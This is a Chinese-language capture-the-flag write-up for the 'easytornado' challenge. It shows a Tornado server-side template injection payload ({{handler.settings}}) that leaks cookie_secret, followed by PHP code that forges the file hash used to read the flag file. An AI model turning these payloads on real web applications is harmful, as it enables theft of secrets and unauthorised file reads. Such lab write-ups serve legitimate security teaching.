---
title: easytornado
tags:
  - Writeups
  - WEB
  - SSTI
categories: CTF
date: 2020-10-13 20:34:39
---


题目描述：Tornado 框架

<!-- more -->

打开网页即看到

<img src="easytornado\txts.png" width=15% />

**flag.txt**

<img src="easytornado\flag.png" width=15% />

**welcome.txt**

<img src="easytornado\welcome.png" width=15% />

**hints.txt**

<img src="easytornado\hints.png" width=20% />

试图前往 `http://220.249.52.133:31621/file?filename=/fllllllllllllag`

跳转到 `http://220.249.52.133:31621/error?msg=Error`

<img src="easytornado\error.png" width=10% />

> 测试后发现还有一个error界面，格式为`/error?msg=Error`，怀疑存在**服务端模板注入攻击 （SSTI）**
>
> 尝试`/error?msg={{datetime}}` 在Tornado的前端页面模板中，`datetime`是指向`python`中`datetime`这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档
>
> <img src="easytornado\datatime.png" style="zoom:60%;" />
>
> 通过查阅文档发现`cookie_secret`在`Application`对象`settings`属性中，还发现`self.application.settings`有一个别名
>
> ```json
> RequestHandler.settings
> An alias for self.application.settings.
> ```
>
> `handler`指向的处理当前这个页面的`RequestHandler`对象， `RequestHandler.settings`指向`self.application.settings`， 因此`handler.settings`指向`RequestHandler.application.settings`。
>
> 构造`payload`获取`cookie_secret`
>
> ```html
> /error?msg={{handler.settings}}
> ```
>
> **--> XCTF Writeups**

<img src="easytornado\handler.settings.png" width=50% />

编写计算`filehash`的代码

```php
<?php

echo "/hints.txt: a68c33bfdef6e15a82c0e1efb8f75b61<br>";
echo "/hints.txt: ".md5("bd8e329b-1065-4e73-92f9-3b2ab8679914".md5("/hints.txt"))."<br>";

echo "/flag.txt: 061ce9130866aded6902f1f97cdd9fb5<br>";
echo "/flag.txt: ".md5("bd8e329b-1065-4e73-92f9-3b2ab8679914".md5("/flag.txt"))."<br>";

echo "/welcome.txt: eccbfd8ca1cd7ee74402c757054f5df8<br>";
echo "/welcome.txt: ".md5("bd8e329b-1065-4e73-92f9-3b2ab8679914".md5("/welcome.txt"))."<br>";

echo md5("bd8e329b-1065-4e73-92f9-3b2ab8679914".md5("/fllllllllllllag.txt"))."<br>";
echo md5("bd8e329b-1065-4e73-92f9-3b2ab8679914".md5("/fllllllllllllag"))."<br>";

?>
```

<img src="easytornado\filehash.png" width=40% />

最后的`7362db03131e10d9a024c3178c140ee7`是`/fllllllllllllag`的`hash`值

访问`http://220.249.52.133:31621/file?filename=%2ffllllllllllllag&filehash=7362db03131e10d9a024c3178c140ee7`

<img src="easytornado\end.png" width=40% />